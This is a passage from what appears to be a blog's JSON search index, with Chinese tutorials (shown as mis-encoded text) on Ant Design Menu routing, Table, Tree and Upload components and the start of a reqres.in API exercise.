/&gt;} /&gt; &lt;/Routes&gt; )} å¥½ï¼Œæ¥ä¸‹ä¾†å¯ä»¥æ€è€ƒä¸€ä»¶äº‹ï¼š æœ‰æ²’æœ‰è¾¦æ³•è®“ menu ä¹Ÿèƒ½æ¸²æŸ“ routerï¼Ÿ ä½ å¯ä»¥å…ˆæƒ³æƒ³çœ‹å¦‚æœè¦è®“ router ä¹Ÿèƒ½å…±ç”¨çš„è©±ï¼Œé‚„éœ€è¦å“ªäº›è³‡æ–™ï¼Ÿ æƒ³å®Œå¾Œå†æ‹‰ä¸‹å»çœ‹ï¼Œæœ€å¾Œæœƒæ•´ç†æˆåƒé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829303132import { Link } from 'react-router-dom'import Home from './Home'import About from './About'import Prodcuts from './Prodcuts'import Service from './Service'const menu = [ { key: 'home', path: '', label: &lt;Link to=''&gt;Home&lt;/Link&gt;, component: &lt;Home /&gt; }, { key: 'products', path: 'products', label: &lt;Link to='products'&gt;Products&lt;/Link&gt;, component: &lt;Products /&gt; }, { key: 'service', path: 'service', label: &lt;Link to='service'&gt;Service&lt;/Link&gt;, component: &lt;Service /&gt; }, { key: 'about', path: 'about', label: &lt;Link to=''&gt;About&lt;/Link&gt;, component: &lt;About /&gt; }] é¦–å…ˆéœ€è¦è®“å°è¦½åˆ—ä¸Šçš„æŒ‰éˆ•å¯ä»¥é€£çµåˆ°è·¯ç”±ï¼Œæ‰€ä»¥æŠŠ label çš„éƒ¨åˆ†æ”¹æˆ &lt;Link&gt; çš„å½¢å¼ã€‚ï¼ˆå¦‚æœå¸Œæœ›ä¸è¦æœ‰é€£çµï¼Œå¯ä»¥ä¿ç•™ç‚ºç´”æ–‡å­—å°±å¥½ï¼‰ æ¥è‘— router çš„éƒ¨åˆ†å› ç‚ºè¦æ¸²æŸ“å‡º &lt;Route path=\"path\" element={&lt;Component /&gt;} /&gt; çš„å½¢å¼ï¼Œæ‰€ä»¥åŠ ä¸Š path è·Ÿ component çš„å±¬æ€§ã€‚ è³‡æ–™ OK ä»¥å¾Œï¼Œæ¥è‘—åªè¦æŠŠæ¸²æŸ“å‡½å¼å¯«å‡ºä¾†å°±å¯ä»¥äº†ï¼š 12345678910111213// è³‡æ–™import { menu } from './menu'// æ¸²æŸ“å‡½å¼function renderRoute(routes) { return routes.map((route) =&gt; ( &lt;Route key={route.key} path={route.path} element={route.component} /&gt; ))}function RouteComponent() { return &lt;Routes&gt;{renderRoute(menu)}&lt;/Routes&gt;} åšåˆ°é€™é‚Šä»¥å¾Œï¼Œå°±å¯ä»¥é€é menu ä¾†è‡ªå‹•ç”Ÿæˆå°è¦½åˆ—è·Ÿè·¯ç”±äº†ï¼Œæƒ³çœ‹ç¯„ä¾‹çš„è©±åˆ° é€™é‚Š çœ‹ã€‚ &lt;= 4.20 çš„åšæ³•å¦‚æœæ˜¯ &lt;=4.20 çš„è©±ï¼Œ&lt;Menu /&gt; ä¸èƒ½ç”¨ items å±¬æ€§ï¼Œæ‰€ä»¥å°±è¦è‡ªå·±å¯«ä¸€å€‹ generator ä¾†ç”¢ç”Ÿï¼š 123456789function Nav() { return ( &lt;Menu&gt; {menu.map((menu) =&gt; ( &lt;Menu.Item key={menu.key}&gt;{menu.label}&lt;/Menu.Item&gt; ))} &lt;/Menu&gt; )} ä¹Ÿæ²’æœ‰å¾ˆè¤‡é›œï¼Œåªæ˜¯é †ä¾¿æä¸€ä¸‹ã€‚ å­è·¯ç”±èˆ‡å­å°è¦½åˆ—é€™é‚Šåªæ˜¯åšå€‹è£œå……ï¼ŒåŸºæœ¬æ¦‚å¿µéƒ½è·Ÿä¸Šé¢ä¸€æ¨£ï¼Œåªæ˜¯è³‡æ–™æ›´å¤šå±¤ï¼Œé‚„æœ‰æ¸²æŸ“å‡½å¼ç¨å¾®è¤‡é›œä¸€é»ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// Nav.tsximport React from 'react'import { Menu } from 'antd'import { Link, Outlet } from 'react-router-dom'import Home from '../pages/Home'import ProdcutA from '../pages/ProductA'import ProdcutB from '../pages/ProductB'export const items = [ { key: 'home', url: '', label: &lt;Link to=''&gt;Home&lt;/Link&gt;, component: &lt;Home /&gt; }, { key: 'products', url: 'products', label: 'Products', component: &lt;Outlet /&gt;, // å­è·¯ç”± &amp; å­å°è¦½ children: [ { key: 'A', url: 'productA/*', label: &lt;Link to='products/productA'&gt;ProdcutA&lt;/Link&gt;, component: &lt;ProdcutA /&gt; }, { key: 'B', url: 'productB/*', label: &lt;Link to='products/productB'&gt;ProdcutB&lt;/Link&gt;, component: &lt;ProdcutB /&gt; } ] }]const Header: React.FC = () =&gt; { return ( &lt;&gt; {/* &lt;Menu mode=\"horizontal\"&gt; {items.map((item: any) =&gt; item.children ? ( &lt;Menu.SubMenu key={item.key} title={item.label}&gt; {item.children.map((subItem: any) =&gt; ( &lt;Menu.Item key={subItem.key}&gt;{subItem.label}&lt;/Menu.Item&gt; ))} &lt;/Menu.SubMenu&gt; ) : ( &lt;Menu.Item key={item.key}&gt;{item.label}&lt;/Menu.Item&gt; ) )} &lt;/Menu&gt; */} &lt;Menu mode='horizontal' items={items} /&gt; &lt;/&gt; )}export default Header 123456789101112131415161718192021222324252627// RouteComponent.tsximport { Routes, Route } from 'react-router-dom'import Header from './components/Header'import { items } from './components/Header'function renderRoute(routes: any) { return routes.map((route: any) =&gt; route.children ? ( route.children.map((subRoute: any) =&gt; ( &lt;Route key={route.key} path={route.url} element={route.component}&gt; &lt;Route key={subRoute.key} path={subRoute.url} element={subRoute.component} /&gt; &lt;/Route&gt; )) ) : ( &lt;Route key={route.key} path={route.url} element={route.component} /&gt; ) )}export default function App() { return ( &lt;&gt; &lt;Header /&gt; &lt;Routes&gt;{renderRoute(items)}&lt;/Routes&gt; &lt;/&gt; )} æƒ³çœ‹ç¯„ä¾‹çš„è©±ä¸€æ¨£åˆ° é€™é‚Š ä¾†çœ‹ã€‚","link":"/2022/05/22/antd-menu/"},{"title":"Ant Designï¼Table","text":"çœ‹èµ·ä¾†è¤‡é›œäº†é»ï¼Œä¸éç†è§£å¾Œå°±é‚„å¥½äº†ã€‚ åŸºæœ¬ç”¨æ³•è¡¨æ ¼æœƒç”¨ &lt;Table /&gt; ä¾†è¡¨ç¤ºï¼Œä¸¦ä¸”æ¥æ”¶ dataSource è·Ÿ columns é€™å…©å€‹ propsã€‚ dataSource è·Ÿ columns çš„å€¼éƒ½æ˜¯ Arrayï¼Œä¾†çœ‹ codeï¼š 12345678910111213141516const dataSource = [ { key: '1', name: 'PeaNu', age: 23, address: 'é«˜é›„å¸‚' }]const columns = [ { title: 'å§“å', dataIndex: 'name', key: 'name' }] é™„è¨»ï¼škey æ˜¯ç”¨ä¾†çµ¦ React æ¸²æŸ“åˆ—è¡¨ç”¨çš„ï¼Œé è¨­æ˜¯ç”¨ key ä¾†è¡¨ç¤ºï¼Œä½†ä½ ä¹Ÿå¯ä»¥ç”¨ rowKey ä¾†é‡æ–°å®šç¾©ï¼Œå¾Œé¢æœƒå†è§£é‡‹ã€‚ é¦–å…ˆ dataSource è£¡é¢æœƒæ”¾æˆ‘å€‘è¦å‘ˆç¾çš„è³‡æ–™ï¼Œç­‰ä¸€ä¸‹æœƒè·Ÿ columns ä¾†åšæ˜ å°„ã€‚ è€Œ columns ä¸­æœ€é‡è¦çš„æ¬„ä½æ˜¯ dataIndexï¼Œå¡«å…¥çš„æ±è¥¿å°±ä»£è¡¨ dataSource ä¸­çš„å“ªå€‹ keyï¼Ÿåƒä¸Šé¢å¡«äº† nameï¼Œæ‰€ä»¥å°±æœƒåˆ° dataSource æ‰¾åˆ° name: 'PeaNu' ç„¶å¾Œé¡¯ç¤ºåˆ°ç•«é¢ä¸Šï¼›è‡³æ–¼ title çš„è©±æ˜¯è¡¨æ ¼çš„æ¬„ä½åç¨±ã€‚ ä¸Šé¢çš„è¼¸å‡ºçµæœå¦‚ä¸‹ï¼š é‡æ–°è¨­å®š key çš„å€¼å‰é¢æœ‰èªª key é€™å€‹å€¼æ˜¯ç”¨ä¾†çµ¦ React æ¸²æŸ“åˆ—è¡¨ç”¨çš„ï¼Œä¸éå¦‚æœè³‡æ–™æ˜¯é€é API å–å¾—çš„è©±ï¼Œé€šå¸¸ä¸æœƒæœ‰ key é€™å€‹æ¬„ä½ï¼Œé‚£æ€éº¼è¾¦ï¼Ÿ é€™æ™‚å€™å°±è¦åœ¨ &lt;Table /&gt; åŠ ä¸Š rowKey é€™å€‹å±¬æ€§ï¼Œå‘Šè¨´ä»–ã€Œæˆ‘è¦æ‹¿å“ªå€‹æ¬„ä½ä¾†ç•¶åš keyã€ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­ API æ‹¿åˆ°çš„è³‡æ–™å¦‚ä¸‹ï¼š 123456789101112const dataSource = [ { userId: '1', name: 'PeaNu', gender: 'M' }, { userId: '2', name: 'PPB', gender: 'F' }] é‚£ &lt;Table /&gt; å°±æœƒé•·é€™æ¨£ï¼š 1&lt;Table rowKey='userId' dataSource={dataSource} columns={columns} /&gt; é€™æ¨£å°±å¯ä»¥è§£æ±º key çš„å•é¡Œäº†ã€‚ å·¢ç‹€çš„è³‡æ–™çµæ§‹å¦‚æœç¾åœ¨è³‡æ–™è®Šæˆé€™æ¨£ï¼š 12345678910const dataSource = [ { name: 'PeaNu', age: 23, address: 'é«˜é›„å¸‚', family: { wife: 'PPB' } }] é‚£ columns å°±å¾—é€™æ¨£å¯«ï¼š 123456const columns = [ { title: 'Wife', dataIndex: ['family', 'wife'] }] å¦‚æœç¾åœ¨åˆè®Šæˆé€™æ¨£ï¼š 123456789101112const dataSource = [ { name: 'PeaNu', age: 23, address: 'é«˜é›„å¸‚', family: [ { wife: 'PPB' } ] }] é‚£ columns å°±å¾—é€™æ¨£å¯«ï¼š 123456const columns = [ { title: 'Wife', dataIndex: ['family', '0', 'wife'] }] é‡æ–°è¨­å®šè¼¸å‡ºåˆ°ç•«é¢çš„å€¼æœ‰æ™‚å€™æˆ‘å€‘å¾ API æ‹¿åˆ°çš„å€¼ä¸æœƒæƒ³ç›´æ¥æ”¾åˆ°ç•«é¢ä¸Šï¼Œä¾‹å¦‚ï¼š 12345678910const dataSource = [ { name: 'PeaNu', gender: 'M' }, { name: 'PPB', gender: 'F' }] é€™æ™‚å€™å°±å¯ä»¥ç”¨ render é€™å€‹å±¬æ€§ä¾†è™•ç†ï¼š 12345678910111213const columns = [ { title: 'Name', dataIndex: 'name' }, { title: 'Gender', dataIndex: 'gender', render: (typeChar: string): string =&gt; { return typeChar === 'F' ? 'å¥³' : 'ç”·' } }] ä¹Ÿå¯ä»¥ç”¨ç¸®å¯«çš„æ–¹å¼ä¾†å¯«ï¼š 12345678910111213const columns = [ { title: 'Name', dataIndex: 'name' }, { title: 'Gender', dataIndex: 'gender', render(value: string): string { return value === 'F' ? 'å¥³' : 'ç”·' } }] æƒ³å†ä»»æ€§ä¸€é»å—ï¼Ÿä½ ç”šè‡³å¯ä»¥ç›´æ¥å›å‚³ä¸€å€‹ JSXï¼š 12345678910111213const columns = [ { title: 'Name', dataIndex: 'name' }, { title: 'Gender', dataIndex: 'gender', render(value: string): React.ReactElement { return typeChar === 'M' ? &lt;h1&gt;å¥³&lt;/h1&gt; : &lt;h1&gt;ç”·&lt;/h1&gt; } }] åŠ ä¸Šäº‹ä»¶è™•ç†é™¤äº† dataSource è·Ÿ columns ä»¥å¤–ï¼Œé‚„æœ‰ä¸€å€‹ onRow å±¬æ€§å¯ä»¥ç”¨ï¼Œç”¨èµ·ä¾†æœƒåƒé€™æ¨£å­ï¼š 123456789101112&lt;Table dataSource={testData} columns={testColumns} onRow={(record: any) =&gt; { return { onClick: (event) =&gt; { console.log('record', record) console.log('click') } } }}/&gt; onRow æœƒæ”¾ä¸€å€‹ functionï¼Œé€™å€‹ function æœƒå›å‚³ä¸€å€‹ç‰©ä»¶ï¼Œè£¡é¢å°±å¯ä»¥æ”¾ event è·Ÿ handlerã€‚ è‡³æ–¼ record çš„å€¼æœƒæ˜¯è§¸ç™¼äº‹ä»¶çš„ã€Œé‚£å€‹æ¬„ä½ã€çš„ dataSource å€¼ã€‚ æˆ‘çŸ¥é“è½èµ·ä¾†è¬›è¶…ç´šç„¡æ•µé›£æ‡‚ï¼Œæ‰€ä»¥ä¸€æ­¥ä¸€æ­¥ä¾†è§£é‡‹å§ã€‚ å‡è¨­ dataSource é•·é€™æ¨£ï¼š 12345678910const dataSource = [ { name: 'PeaNu', gender: 'M' }, { name: 'PPB', gender: 'F' }] ç„¶å¾Œæˆ‘é»äº† PeaNu é‚£ä¸€æ’ï¼š é‚£ record çš„å€¼å°±æœƒæ˜¯ï¼š 1234{ name: 'PeaNu', gender: 'M'} åŠ ä¸Šæ»¾è»¸å¦‚æœæ²’æœ‰åšé¡å¤–è¨­å®šçš„è©±ï¼Œé è¨­çš„ &lt;Table /&gt; æœƒã€Œè‡ªé©æ‡‰ã€åšç¸®æ”¾ï¼Œç›´åˆ°æ”¾ä¸ä¸‹æ™‚ï¼Œæœƒåœ¨è¦–çª—ç”¢ç”Ÿæ»¾è»¸ï¼Œåƒé€™æ¨£ï¼š æœ‰æ²’æœ‰è¾¦æ³•è®“æ»¾è»¸ç”¢ç”Ÿåœ¨ã€Œè¡¨æ ¼ä¸­ã€å°±å¥½ï¼Ÿé‚„çœŸçš„æœ‰ï¼Œå°±æ˜¯åŠ ä¸Š scroll å±¬æ€§ï¼š 123456789&lt;Table rowKey='id' dataSource={testData} columns={testColumns} scroll={{ x: 1000, y: 150 }}/&gt; è£¡é¢è¦å‚³ä¸€å€‹ç‰©ä»¶ï¼Œç„¶å¾ŒæŒ‡å®š x è»¸å’Œ y è»¸çš„ã€Œå¯¬åº¦ã€ã€‚é€™å…©å€‹çš„è¡Œç‚ºä¸å¤ªä¸€æ¨£ï¼Œè¦åˆ†æ¸…æ¥šã€‚ y è»¸çš„æ¦‚å¿µæ¯”è¼ƒç°¡å–®ï¼Œæƒ³æˆæ˜¯ç¸½é«˜åº¦å°±å¥½ã€‚ä¾‹å¦‚æˆ‘è¨­ç‚º 150ï¼Œé‚£è¡¨æ ¼çš„é«˜åº¦å°±æœƒå›ºå®šæˆ 150pxï¼Œç•¶è³‡æ–™è¶…é 150px çš„è©±å°±æœƒç”¢ç”Ÿæ»¾è»¸ã€‚ è‡³æ–¼ x è»¸çš„éƒ¨åˆ†ï¼Œä½ å¯ä»¥é€™æ¨£è¨˜ã€Œç•¶è¦–çª—å°æ–¼ x æ™‚ï¼Œæˆ‘å¸Œæœ›è¡¨æ ¼çš„å¯¬åº¦æœ‰å¤šå¯¬ã€ã€‚æ‰€ä»¥æˆ‘è¨­ç‚º 1000 æ™‚ï¼Œå°±ä»£è¡¨ç•¶è¦–çª—å¯¬åº¦ä½æ–¼ 1000 æ™‚è¡¨æ ¼çš„å¯¬åº¦æœƒå›ºå®šåœ¨ 1000pxï¼Œç„¶å¾Œç”¢ç”Ÿæ»¾è»¸ã€‚ é€™æ¨£æœƒå¥½è¨˜ä¸€é»ï¼Œæ‰€ä»¥é€™æ¨£è¨˜å°±å¥½ã€‚ åŠ ä¸Šæ’åºå’Œéæ¿¾å¦‚æœæˆ‘æœ‰é€™æ¨£çš„è¡¨æ ¼ï¼š æˆ‘å¸Œæœ›å¯ä»¥åŠ ä¸Šå‡å†ªè·Ÿé™å†ªæ’åºçš„é¸é …ï¼Œé‚£æˆ‘å¯ä»¥åœ¨ columns åŠ ä¸Šé€™æ¨£çš„è¨­å®šï¼š 1234567891011121314151617181920const columns = useRef([ { title: 'User id', dataIndex: 'id', // é€™å€‹å°±è·Ÿ array.sort çš„ç”¨æ³•ä¸€æ¨£ sorter: (a: any, b: any) =&gt; a.id - b.id }, { title: 'First name', dataIndex: 'first_name' }, { title: 'Last name', dataIndex: 'last_name' }, { title: 'Email', dataIndex: 'email' }]) ä¹Ÿå¯ä»¥åŠ ä¸Šé è¨­å€¼ï¼Œä¸éè¦æ³¨æ„ä¸€ä¸‹ type çš„å•é¡Œï¼Œæ²’è¨­å®šå¥½çš„è©±æœƒå‡ºéŒ¯ï¼š 12345678910111213141516171819202122// è¨˜å¾—æŒ‡å®š typeï¼Œå¦å‰‡æœƒå‡ºéŒ¯const columns = useRef&lt;any[]&gt;([ { title: 'User id', dataIndex: 'id', sorter: (a: any, b: any) =&gt; a.id - b.id, // ascend | descend defaultSortOrder: 'ascend' }, { title: 'First name', dataIndex: 'first_name' }, { title: 'Last name', dataIndex: 'last_name' }, { title: 'Email', dataIndex: 'email' }]) æ¥è‘—ï¼Œå¦‚æœæˆ‘å¸Œæœ›åŠ ä¸Šéæ¿¾çš„åŠŸèƒ½ï¼Œåƒé€™æ¨£ï¼š é‚£å°±è¦åœ¨ columns ä¸ŠåŠ ä¸Šå…©å€‹æ±è¥¿ï¼š filtersï¼Œä¸€å€‹ Array onFilterï¼Œä¸€å€‹ function ä¸€æ¨£ä¾†çœ‹ code è§£é‡‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142const columns = useRef&lt;any[]&gt;([ { title: 'User id', dataIndex: 'id' }, { title: 'First name', dataIndex: 'first_name', // ç”¨ä¾†é¡¯ç¤ºä¸‹æ‹‰é¸å–®çš„ã€Œé¡¯ç¤ºæ–‡å­—ã€è·Ÿã€Œè³‡æ–™å€¼ã€ filters: [ { text: 'George', value: 'George' }, { text: 'Janet', value: 'Janet' }, { text: 'Emma', value: 'Emma' } ], onFilter: (value: any, record: any) =&gt; { // record æœƒéæ­· dataSource çš„æ¯ä¸€ç­†è³‡æ–™ // value = filters ä¸­è¨­å®šçš„å€¼ console.log('value', value) console.log('record', record) console.log('filter', record.first_name === value) // é€™é‚Šæƒ³æˆæ˜¯ Array.filter çš„é‚è¼¯å°±å¥½ return record.first_name === value } }, { title: 'Last name', dataIndex: 'last_name' }, { title: 'Email', dataIndex: 'email' }]) é€™æ¨£å°±å¯ä»¥å¯¦ç¾éæ¿¾çš„åŠŸèƒ½äº†ã€‚ çµå°¾æœ€å¾Œç¶œåˆä»¥ä¸Šæ‰€å­¸ï¼Œæˆ‘åšäº†ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œæœ‰éœ€è¦çš„è©±å¯ä»¥å»åƒè€ƒçœ‹çœ‹ã€‚","link":"/2022/05/15/antd-table/"},{"title":"Ant Designï¼Tree","text":"æ¯”è¼ƒå°‘æœƒç¢°åˆ°çš„å…ƒä»¶ã€‚ åŸºæœ¬ç”¨æ³• æ²’æœ‰ä»»ä½•åŠŸèƒ½ï¼Œåªå–®ç´”é¡¯ç¤ºè³‡æ–™ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243import { Tree } from 'antd'import { DataNode } from 'antd/lib/tree'const AntdTree = () =&gt; { const treeData2: DataNode[] = [ { title: 'A', key: 'A', children: [ { title: 'A-1', key: 'A-1' }, { title: 'A-2', key: 'A-2' } ] }, { title: 'B', key: 'B', children: [ { title: 'B-1', key: 'B-1' }, { title: 'B-2', key: 'B-2' } ] } ] return ( &lt;div&gt; &lt;Tree treeData={treeData2} defaultExpandedKeys={['B']} /&gt; &lt;/div&gt; )}export default AntdTree ä¸€å€‹é …ç›®è‡³å°‘æœƒæœ‰ title è·Ÿ key å…©å€‹ propsï¼Œtitle æ˜¯é¡¯ç¤ºåœ¨ç•«é¢ä¸Šçš„å…§å®¹ï¼Œkey å‰‡æ˜¯æ‹¿ä¾†åšæ“ä½œæ™‚çš„ä¸€ç¨®åƒç…§ã€‚ä¾‹å¦‚é€™é‚Šä¸€é–‹å§‹æƒ³è®“ B ç¯€é»æ˜¯å±•é–‹çš„ï¼Œå°±å¯ä»¥æŠŠ B ç¯€é»çš„ key å‚³å…¥ defaultExpandedKeys å°±æœ‰é€™å€‹æ•ˆæœäº†ï¼š åšæˆ Controlled Component å¯ä»¥ç”¨ expandedKeys è¨­å®šå±•é–‹çš„é …ç›®ï¼Œå†æ­é… onExpand ä¾†æ›´æ–°ç‹€æ…‹å°±å¯ä»¥è®Šæˆå—æ§çµ„ä»¶ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import { Tree } from 'antd'import { DataNode } from 'antd/lib/tree'import { useState } from 'react'const AntdTree = () =&gt; { const [expandedKeys, setExpandedKeys] = useState&lt;React.Key[]&gt;([]) const treeData2: DataNode[] = [ { title: 'A', key: 'A', children: [ { title: 'A-1', key: 'A-1', children: [ { title: 'A-1-1', key: 'A-1-1' } ] }, { title: 'A-2', key: 'A-2' } ] }, { title: 'B', key: 'B', children: [ { title: 'B-1', key: 'B-1' }, { title: 'B-2', key: 'B-2' } ] } ] function handleExpand(expandedKeysValue: React.Key[]) { console.log('expand keys', expandedKeysValue) setExpandedKeys(expandedKeysValue) } return ( &lt;div&gt; &lt;Tree treeData={treeData2} expandedKeys={expandedKeys} onExpand={handleExpand} /&gt; &lt;/div&gt; )}export default AntdTree Draggable è¦è®“ç¯€é»è®Šæˆã€Œå¯æ‹–æ›³ã€é …ç›®çš„è©±è¦åŠ ä¸Š draggableï¼Œä¸¦ä¸”åœ¨ onDrop æ™‚ä¾†æ›´æ–°ç¯€é»è³‡æ–™ã€‚ åº•ä¸‹æ˜¯ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œæ¯”è¼ƒè¤‡é›œçš„éƒ¨åˆ†éƒ½æ˜¯é›†ä¸­åœ¨ onDrop çš„è™•ç†ï¼Œæ‰€ä»¥è«‹ç›´æ¥çœ‹è¨»è§£æœƒæ¯”è¼ƒå¥½ç†è§£ä¸€é»ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134import { Tree } from 'antd'import { DataNode, TreeProps } from 'antd/lib/tree'import { useState } from 'react'const AntdTree = () =&gt; { const [treeData, setTreeData] = useState&lt;DataNode[]&gt;([ { title: 'A', key: 'A', children: [ { title: 'A-1', key: 'A-1', children: [ { title: 'A-1-1', key: 'A-1-1' } ] }, { title: 'A-2', key: 'A-2' }, { title: 'A-3', key: 'A-3' }, { title: 'A-4', key: 'A-4' } ] }, { title: 'B', key: 'B', children: [ { title: 'B-1', key: 'B-1' }, { title: 'B-2', key: 'B-2' } ] } ]) // onDrop æœƒå‚³å…¥ä¸€å€‹ info åƒæ•¸ï¼Œè£¡é¢å¯ä»¥æ‹¿åˆ°æœ‰ç”¨çš„è³‡è¨Š const handleDrop: TreeProps['onDrop'] = (info) =&gt; { // drag å…ƒç´ çš„ key const dragKey = info.dragNode.key // drog å…ƒç´ çš„ key const dropKey = info.node.key // drop ä½ç½®ï¼ˆä¸ç²¾ç¢ºï¼‰ const dropPos = info.node.pos.split('-') // ç²¾ç¢ºä½ç½®ï¼ˆç”¨ä¾†åˆ¤æ–·æ˜¯ä¸æ˜¯é ‚å±¤ç¬¬ä¸€å€‹ä½ç½®ï¼‰ const realDropPosition = info.dropPosition - Number(dropPos[dropPos.length - 1]) // æ˜¯ä¸æ˜¯æ”¾åˆ°ç¸«éš™é–“ const isDropToGap = info.dropToGap // ç”¨ä¾†æœå°‹ç¯€é»çš„ function const searchNode = ( data: DataNode[], key: React.Key, callback: (nodeData: DataNode, nodeIndex: number, nodeArray: DataNode[]) =&gt; void ) =&gt; { for (let i = 0; i &lt; data.length; i++) { const isMatchKey = data[i].key === key if (isMatchKey) { // æ‰¾åˆ°å°æ‡‰çš„ keyï¼ŒæŠŠè³‡æ–™å’Œä½ç½®å¸¶å‡ºå» return callback(data[i], i, data) } // å­ç¯€é»å­˜åœ¨ï¼Œç”¨éè¿´æœå°‹ if (data[i].children) { searchNode(data[i].children!, key, callback) } } } // è¤‡è£½åŸæœ¬çš„è³‡æ–™ const newTreeData = JSON.parse(JSON.stringify(treeData)) let dragObj: DataNode // æŠŠ dragKeyï¼ˆè¢«æ‹–æ‹‰çš„ç¯€é»ï¼‰å‚³å…¥ï¼Œæ‰¾å‡ºå°æ‡‰ç¯€é»å’Œä½ç½® searchNode(newTreeData, dragKey, (nodeData, nodeIndex, nodeArray) =&gt; { // æŠŠè¢«æ‹–æ‹‰çš„ç¯€é»å¾é™£åˆ—ä¸­åˆªé™¤ nodeArray.splice(nodeIndex, 1) // å„²å­˜è¢«æ‹–æ‹‰çš„ç¯€é»è³‡æ–™ dragObj = nodeData console.log('dragObj', dragObj) }) // å¦‚æœä¸æ˜¯æ’åˆ°ä¸­é–“ if (!isDropToGap) { // æŠŠ dropKeyï¼ˆç›®æ¨™ç¯€é»ï¼‰å‚³å…¥ï¼Œæ‰¾å‡ºå°æ‡‰ç¯€é»é™£åˆ—ï¼ˆå› ç‚ºä¸æ˜¯æ’å…¥æ‰€ä»¥ä¸éœ€è¦ä½ç½®ï¼‰ searchNode(newTreeData, dropKey, (nodeData) =&gt; { // å¦‚æœ drop çš„ç¯€é»é™£åˆ—æœ‰ children å°±ç”¨å®ƒçš„ï¼Œæ²’æœ‰å°±å»ºç«‹ä¸€å€‹æ–°çš„ï¼ˆç©ºé™£åˆ—ï¼‰ nodeData.children = nodeData.children || [] // æŠŠ drag ç¯€é»æ”¾åˆ°æœ€å‰é¢çš„ä½ç½® nodeData.children.unshift(dragObj) }) } // å¦‚æœæ˜¯æ’åˆ°ä¸­é–“ else { // æŠŠ dropKeyï¼ˆç›®æ¨™ç¯€é»ï¼‰å‚³å…¥ï¼Œæ‰¾å‡ºç¯€é»é™£åˆ—å’Œä½ç½® searchNode(newTreeData, dropKey, (nodeData, nodeIndex, nodeArray) =&gt; { console.log('nodeArray', nodeArray) console.log('dropDataIndex', nodeIndex) // -1 ä»£è¡¨æœ€é ‚å±¤çš„ç¬¬ä¸€å€‹ä½ç½® if (realDropPosition === -1) { // æ”¾åˆ°ç›®æ¨™ç¯€é»å‰é¢ nodeArray.splice(nodeIndex, 0, dragObj) } else { // æ”¾åˆ°ç›®æ¨™ç¯€é»å¾Œé¢ nodeArray.splice(nodeIndex + 1, 0, dragObj) } }) } setTreeData(newTreeData) } return ( &lt;div&gt; &lt;Tree treeData={treeData} selectable={false} onDrop={handleDrop} draggable blockNode /&gt; &lt;/div&gt; )}export default AntdTree å¯¦éš›ç¯„ä¾‹å¯ä»¥åƒè€ƒ CodeSandbox","link":"/2023/03/16/antd-tree/"},{"title":"Ant Designï¼Upload ç›¸é—œçš„ Props","text":"éš¨æ‰‹è¨˜ã€‚ beforeUploadé è¨­æœƒåœ¨é¸å–æª”æ¡ˆå¾Œè‡ªå‹•ä¸Šå‚³ï¼ˆç™¼ requestï¼‰ï¼Œå¦‚æœæƒ³å–æ¶ˆé€™å€‹è¡Œç‚ºå¯ä»¥ç”¨ beforeUpload ä¾†è™•ç†ï¼š 123&lt;Upload beforeUpload={() =&gt; false}&gt; &lt;Button&gt;Upload&lt;/Button&gt;&lt;/Upload&gt; åªè¦å›å‚³ false å°±æœƒå–æ¶ˆäº†ã€‚ æˆ‘å€‘è‡ªå·±æ¯”è¼ƒå¸¸åšä¸€äº›è™•ç†å¾Œåœ¨ä¸Šå‚³ï¼Œæ‰€ä»¥ä¸å¸¸ç”¨åˆ°é€™å€‹å…§å»ºåŠŸèƒ½ã€‚ å¯¦éš›ç”¨é€”é™¤äº†å–æ¶ˆè‡ªå‹•ä¸Šå‚³ä»¥å¤–ï¼Œé€™å€‹ function ä¹Ÿæœƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼š å–®å€‹æª”æ¡ˆï¼ˆå¦‚æœå¤šé¸çš„è©±æœƒé‡è¤‡å‘¼å«é€™å€‹ functionï¼‰ çµ„æˆ List çš„æª”æ¡ˆå…§å®¹ ä¾‹å¦‚èªªï¼š 123456789function onFileSelect(file: File, fileList: File[]) { console.log('single file: ', file) console.log('file list: ', fileList) return false};&lt;Upload multiple={true} beforeUpload={onFileSelect} showUploadList={false}&gt; &lt;Button&gt;Upload&lt;/Button&gt;&lt;/Upload&gt; ç•¶æˆ‘é¸äº†å…©å€‹æª”æ¡ˆå¾Œæœƒè¼¸å‡ºï¼š æ‰€ä»¥å¦‚æœä½ æƒ³è¦å°é€™äº›è³‡æ–™åšè™•ç†çš„è©±ï¼Œé€™æ˜¯ä¸€å€‹å¾ˆä¸éŒ¯çš„ hookã€‚ showUploadListé è¨­åœ¨é¸å®Œæª”æ¡ˆå¾Œæœƒè‡ªå‹•ç”Ÿæˆæª”æ¡ˆåˆ—è¡¨ï¼Œå¯ä»¥ç”¨é€™å€‹ props ä¾†å–æ¶ˆï¼š 123&lt;Upload showUploadList={false}&gt; &lt;Button&gt;Upload&lt;/Button&gt;&lt;/Upload&gt;","link":"/2022/08/28/antd-upload-props/"},{"title":"åŸºæœ¬çš„ä¸²æ¥ API ç·´ç¿’","text":"ç°¡å–®å»ä¹Ÿå¯¦ç”¨ã€‚ ç°¡è¿°é€™è£¡æœƒä»¥ reqres é€™å€‹ API ä¾†åšåŸºæœ¬çš„ä¸²æ¥ç·´ç¿’ï¼š GET å–å¾—ä½¿ç”¨è€…è³‡æ–™ POST æ–°å¢ä½¿ç”¨è€…è³‡æ–™ DELETE åˆªé™¤ä½¿ç”¨è€…è³‡æ–™ PATCH ä¿®æ”¹ä½¿ç”¨è€…è³‡æ–™ åŸå§‹ç¢¼GETï¼š 1234567const request = require('request')// argument variableï¼Œè®“ä½ å¯ä»¥ node index.js ã€Œ1ã€const { argv } = require('process')// GET è«‹æ±‚request(`https://reqres.in/api/users/${argv[2]}`, (error, response, body) =&gt; console.log(JSON.parse(body))) POSTï¼š 123456789101112const request = require('request')// æ–°å¢ä½¿ç”¨è€…è³‡æ–™request.post( { 